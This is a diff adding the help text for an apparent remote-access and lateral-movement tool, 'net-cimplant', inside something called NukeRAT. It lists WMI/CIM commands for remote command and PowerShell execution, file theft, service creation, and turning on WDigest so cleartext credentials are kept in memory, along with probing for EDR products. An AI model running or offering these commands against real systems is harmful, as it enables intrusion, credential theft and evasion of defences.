@@ -1,0 +1,81 @@
+ABOUT
+    Supports file operations, registry, services, process management,
+    lateral movement facilitation, and system enumeration. Requires local
+    administrator permissions on the target system.
+
+USAGE:
+    net-cimplant --- -s <IP> -c <command> [options]
+
+EXAMPLES:
+    net-cimplant --- -s 10.0.0.5 -c cat -f C:\Users\user\desktop\file.txt
+    net-cimplant --- -s 10.0.0.5 -u user -d DOMAIN -p password -c cat -f C:\Users\test\desktop\file.txt
+    net-cimplant --- -s 10.0.0.5 -u user -d DOMAIN -p password -c command_exec --execute "dir c:\\"
+    net-cimplant --- -s 10.0.0.5 -c ps
+    net-cimplant --- -s 10.0.0.5 -c basic_info
+    net-cimplant --- -s 10.0.0.5 -c enable_wdigest
+    net-cimplant --- -s 10.0.0.5 -c remote_posh -f C:\script.ps1
+    net-cimplant --- --show-commands
+    net-cimplant --- --show-examples
+
+CONNECTION OPTIONS:
+    -s, --system        Remote system IP or hostname (required)
+    -u, --username      Username for alternate credentials
+    -p, --password      Password for alternate credentials
+    -d, --domain        Domain (default: WORKGROUP)
+    -n, --namespace     WMI namespace (default: root\cimv2)
+    --wmi               Use WMI (DCOM) instead of CIM (WSMan)
+    --nops              Disable PowerShell execution
+
+COMMAND OPTIONS:
+    -c, --command       Command to execute (required unless show-commands)
+    -e, --execute       Command line for command_exec
+    -f, --file          Remote or local file path
+    --directory         Directory to list or search
+    --fileto            Destination path for copy
+    --regkey            Registry key path
+    --regsubkey         Registry subkey name
+    --regval            Registry value data
+    --regvaltype        Registry value type (REG_DWORD, REG_SZ, etc.)
+    --service           Service name
+    --servicebin        Service binary path
+    --process           Process name or PID
+    -r, --reset         Reset DebugFilePath property on error
+
+COMMANDS:
+    cat                 Read file contents
+    copy                Copy a file
+    download            Download a file from target
+    ls                  Directory listing
+    search              Search for a file
+    upload              Upload a file to target
+    command_exec        Run command line and receive output
+    disable_wdigest     Set UseLogonCredential registry value to zero
+    enable_wdigest      Add UseLogonCredential registry value
+    disable_winrm       Disable WinRM on target
+    enable_winrm        Enable WinRM on target
+    reg_mod             Modify registry value
+    reg_create          Create registry value
+    reg_delete          Delete registry value
+    remote_posh         Run PowerShell script on remote system
+    service_mod         Create, delete, or modify services
+    process_kill        Kill process by name or PID
+    process_start       Start a process
+    ps                  Process listing
+    active_users        List domain users with active processes
+    basic_info          Enumerate basic system metadata
+    drive_list          List local and network drives
+    ifconfig            IP info from active NICs
+    installed_programs  List installed programs
+    logoff              Log users off
+    reboot, restart     Reboot target
+    power_off, shutdown Power off target
+    vacant_system       Check if user is away
+    edr_query           Query for EDR vendors
+    logon_events        Identify users that logged on
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    net-cimplant -w 60 --- -s 10.0.0.5 -c cat -f C:\Users\user\desktop\file.txt
